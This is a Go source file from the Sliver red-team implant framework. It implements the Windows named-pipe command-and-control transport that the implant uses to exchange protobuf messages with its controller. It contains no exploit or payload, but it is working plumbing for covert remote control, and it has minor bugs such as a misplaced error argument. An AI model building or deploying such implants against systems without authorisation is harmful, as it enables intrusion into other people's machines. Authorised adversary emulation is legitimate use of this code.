package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.NamePipec2Enabled}}

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"net/url"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/Microsoft/go-winio"
	"github.com/golang/protobuf/proto"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	readBufSizeNamedPipe  = 1024
	writeBufSizeNamedPipe = 1024
)

// namedPipeDial - Reverse Named Pipe implant transport (Windows only)
func namePipeDial(uri *url.URL) (*Connection, error) {
	address := uri.String()
	address = strings.ReplaceAll(address, "namedpipe://", "")
	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
	// {{if .Config.Debug}}
	log.Print("Named pipe address: ", address)
	// {{end}}
	conn, err := winio.DialPipe(address, nil)
	if err != nil {
		return nil, err
	}

	// Setup RPC read/write loop over the named pipe.
	connection, err := setupSessionRPC(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to connect over named pipe: %v, err")
	}
	if conn == nil {
		return nil, fmt.Errorf("failed to connect over named pipe (unkown reason)")
	}

	return connection, nil
}

func namedPipeWriteEnvelope(conn *net.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("[namedpipe] Marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	_, err = (*conn).Write(dataLengthBuf.Bytes())
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Error %v and %d\n", err, dataLengthBuf)
		// {{end}}
	}
	totalWritten := 0
	for totalWritten < len(data)-writeBufSizeNamedPipe {
		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
		totalWritten += n
		if err2 != nil {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Error %v\n", err)
			// {{end}}
		}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Error %v\n", err)
			// {{end}}
		}
	}
	return nil
}

func namedPipeReadEnvelope(conn *net.Conn) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4)
	_, err := (*conn).Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSizeNamedPipe)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := (*conn).Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Unmarshaling envelope error: %v", err)
		// {{end}}
		return &pb.Envelope{}, err
	}
	return envelope, nil
}

// {{end}} -NamePipec2Enabled
